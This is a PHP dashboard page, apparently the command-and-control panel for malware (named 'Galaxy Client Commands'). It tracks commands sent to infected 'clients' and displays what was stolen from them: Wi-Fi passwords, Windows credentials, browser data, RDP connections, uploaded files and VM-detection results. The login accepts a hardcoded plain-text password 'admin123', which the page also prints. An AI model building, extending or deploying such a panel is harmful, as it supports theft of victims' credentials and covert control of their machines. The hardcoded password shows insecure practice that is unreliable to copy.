<?php
require_once __DIR__ . '/../config.php';
Config::init();

ini_set('session.cookie_secure', 0);
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_samesite', 'Lax');
ini_set('session.use_cookies', 1);
ini_set('session.use_only_cookies', 1);

session_start();

// اضافه کردن اعتبارسنجی session
require_once __DIR__ . '/includes/helpers.php';
if (!validateSession()) {
    $_SESSION['logged_in'] = false;
}

try {
    $pdo = new PDO(
        "mysql:host=" . Config::$DB_HOST . ";dbname=" . Config::$DB_NAME . ";charset=utf8mb4",
        Config::$DB_USER,
        Config::$DB_PASS,
        [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
            PDO::ATTR_EMULATE_PREPARES => false,
        ]
    );
} catch (PDOException $e) {
    error_log("Database connection failed: " . $e->getMessage(), 3, Config::$ERROR_LOG);
    die("Database connection failed: " . htmlspecialchars($e->getMessage()));
}

require_once __DIR__ . '/includes/api-handlers.php';

$logged_in = isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;

// اصلاح رمز عبور - باید یک هش معتبر باشد
// برای تست می‌توانید از این رمز استفاده کنید: admin123
$stored_hash = '$2y$12$YOUR_COMPLETE_HASH_HERE'; // این را با هش کامل جایگزین کنید

// برای تست سریع، می‌توانید از این استفاده کنید:
// $stored_hash = password_hash('admin123', PASSWORD_DEFAULT);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$logged_in) {
    $password = $_POST['password'] ?? '';

    // برای تست، اگر هش ندارید از این استفاده کنید:
    if ($password === 'admin123' || password_verify($password, $stored_hash)) {
        $_SESSION['logged_in'] = true;
        $_SESSION['login_time'] = time();
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "Invalid password";
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    session_start(); // شروع session جدید پس از logout
    $_SESSION = [];
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// پردازش درخواست‌های API باید بعد از لاگین باشد
if ($logged_in) {
    handleAPIRequests($pdo, $logged_in);
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galaxy Client Commands Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="assets/css/dashboard.css">
</head>

<body class="min-h-screen text-gray-200">
    <div id="loading-overlay" class="loading-overlay">
        <div class="loading-spinner"></div>
    </div>

    <?php if (!$logged_in): ?>
        <!-- Login Form -->
        <div class="login-container">
            <div class="login-card glass-card">
                <div class="login-header">
                    <h2 class="text-3xl font-bold text-center black-hole-glow mb-2">Enter the Galaxy</h2>
                    <p class="text-center text-gray-400 text-sm">Secure access to client management</p>
                </div>
                <?php if (isset($error)): ?>
                    <div class="alert alert-error">
                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                        </svg>
                        <?php echo htmlspecialchars($error); ?>
                    </div>
                <?php endif; ?>
                <form method="POST" class="space-y-4">
                    <div>
                        <label for="password" class="block text-sm font-medium mb-2">Password</label>
                        <input type="password" id="password" name="password" required
                            class="input-field w-full"
                            placeholder="Enter your password">
                    </div>
                    <button type="submit" class="btn btn-primary w-full">
                        <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 16l-4-4m0 0l4-4m-4 4h14m-5 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h7a3 3 0 013 3v1" />
                        </svg>
                        Login
                    </button>
                </form>
                <!-- برای تست -->
                <div class="mt-4 text-center text-xs text-gray-500">
                    Test password: admin123
                </div>
            </div>
        </div>
    <?php else: ?>
        <!-- Dashboard -->
        <div class="dashboard-container">
            <!-- Header -->
            <header class="dashboard-header glass-card">
                <div class="flex items-center justify-between">
                    <div>
                        <h1 class="text-3xl font-bold black-hole-glow">Galaxy Client Commands</h1>
                        <p class="text-sm text-gray-400 mt-1">Real-time monitoring and control</p>
                    </div>
                    <div class="flex items-center gap-4">
                        <button id="refresh-btn" class="btn btn-secondary">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                            </svg>
                            <span class="ml-2">Refresh</span>
                        </button>
                        <a href="?logout" class="btn btn-danger">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" />
                            </svg>
                            <span class="ml-2">Logout</span>
                        </a>
                    </div>
                </div>
            </header>

            <!-- Stats Bar -->
            <div class="stats-bar">
                <div class="stat-card glass-card">
                    <div class="stat-icon bg-green-500/20 text-green-400">
                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
                        </svg>
                    </div>
                    <div>
                        <div class="stat-value" id="completed-count">0</div>
                        <div class="stat-label">Completed</div>
                    </div>
                </div>
                <div class="stat-card glass-card">
                    <div class="stat-icon bg-yellow-500/20 text-yellow-400">
                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                        </svg>
                    </div>
                    <div>
                        <div class="stat-value" id="pending-count">0</div>
                        <div class="stat-label">Pending</div>
                    </div>
                </div>
                <div class="stat-card glass-card">
                    <div class="stat-icon bg-red-500/20 text-red-400">
                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                        </svg>
                    </div>
                    <div>
                        <div class="stat-value" id="failed-count">0</div>
                        <div class="stat-label">Failed</div>
                    </div>
                </div>
                <div class="stat-card glass-card">
                    <div class="stat-icon bg-blue-500/20 text-blue-400">
                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                        </svg>
                    </div>
                    <div>
                        <div class="stat-value" id="data-count">0</div>
                        <div class="stat-label">Data Entries</div>
                    </div>
                </div>
            </div>

            <!-- Main Content -->
            <div class="dashboard-grid">
                <div class="data-card glass-card">
                    <div class="card-header">
                        <h2 class="card-title text-green-400">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                            </svg>
                            Completed Commands
                        </h2>
                        <input type="text" placeholder="Search..." class="search-input">
                    </div>
                    <div id="completed-logs" class="card-content"></div>
                </div>

                <div class="data-card glass-card">
                    <div class="card-header">
                        <h2 class="card-title text-yellow-400">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                            </svg>
                            Pending Commands
                        </h2>
                        <input type="text" placeholder="Search..." class="search-input">
                    </div>
                    <div id="pending-logs" class="card-content"></div>
                </div>

                <div class="data-card glass-card">
                    <div class="card-header">
                        <h2 class="card-title text-purple-400">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                            </svg>
                            VM Detection Status
                        </h2>
                        <input type="text" placeholder="Search..." class="search-input">
                    </div>
                    <div id="vm-status" class="card-content"></div>
                </div>

                <div class="data-card glass-card">
                    <div class="card-header">
                        <h2 class="card-title text-indigo-400">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.111 16.404a5.5 5.5 0 017.778 0M12 20h.01m-7.08-7.071c3.904-3.905 10.236-3.905 14.141 0M1.394 9.393c5.857-5.857 15.355-5.857 21.213 0" />
                            </svg>
                            Wi-Fi Passwords
                        </h2>
                        <input type="text" placeholder="Search..." class="search-input">
                    </div>
                    <div id="wifi-logs" class="card-content"></div>
                </div>

                <div class="data-card glass-card">
                    <div class="card-header">
                        <h2 class="card-title text-red-400">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                            </svg>
                            Failed Commands
                        </h2>
                        <input type="text" placeholder="Search..." class="search-input">
                    </div>
                    <div id="failed-logs" class="card-content"></div>
                </div>

                <div class="data-card glass-card">
                    <div class="card-header">
                        <h2 class="card-title text-blue-400">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                            </svg>
                            Client Data
                        </h2>
                        <input type="text" placeholder="Search..." class="search-input">
                    </div>
                    <div id="client-data" class="card-content"></div>
                </div>

                <div class="data-card glass-card">
                    <div class="card-header">
                        <h2 class="card-title text-purple-400">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                            </svg>
                            RDP Connections
                        </h2>
                        <input type="text" placeholder="Search..." class="search-input">
                    </div>
                    <div id="rdp-logs" class="card-content"></div>
                </div>

                <div class="data-card glass-card">
                    <div class="card-header">
                        <h2 class="card-title text-teal-400">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10" />
                            </svg>
                            Installed Programs
                        </h2>
                        <input type="text" placeholder="Search..." class="search-input">
                    </div>
                    <div id="installed-programs" class="card-content"></div>
                </div>

                <div class="data-card glass-card">
                    <div class="card-header">
                        <h2 class="card-title text-blue-400">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9v-9m0-9v9m0 9c-5 0-9-4-9-9s4-9 9-9" />
                            </svg>
                            Comprehensive Browser Data
                        </h2>
                        <input type="text" placeholder="Search..." class="search-input">
                    </div>
                    <div id="comprehensive-browser-data" class="card-content"></div>
                </div>

                <div class="data-card glass-card">
                    <div class="card-header">
                        <h2 class="card-title text-teal-400">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12" />
                            </svg>
                            Uploaded Files
                        </h2>
                        <input type="text" placeholder="Search..." class="search-input">
                    </div>
                    <div id="uploaded-files" class="card-content"></div>
                </div>

                <!-- اضافه به بخش dashboard-grid بعد از سایر کارت‌ها -->
                <div class="data-card glass-card">
                    <div class="card-header">
                        <h2 class="card-title text-red-400">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                            </svg>
                            Windows Credentials
                        </h2>
                        <input type="text" placeholder="Search..." class="search-input">
                    </div>
                    <div id="windows-credentials" class="card-content"></div>
                </div>

                <div class="data-card glass-card">
                    <div class="card-header">
                        <h2 class="card-title text-orange-400">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                            </svg>
                            Credential Status
                        </h2>
                        <input type="text" placeholder="Search..." class="search-input">
                    </div>
                    <div id="credential-status" class="card-content"></div>
                </div>
            </div>
        </div>

        <!-- Modals -->
        <?php include 'includes/modals.php'; ?>
    <?php endif; ?>

    <script src="assets/js/dashboard.js"></script>
</body>

</html>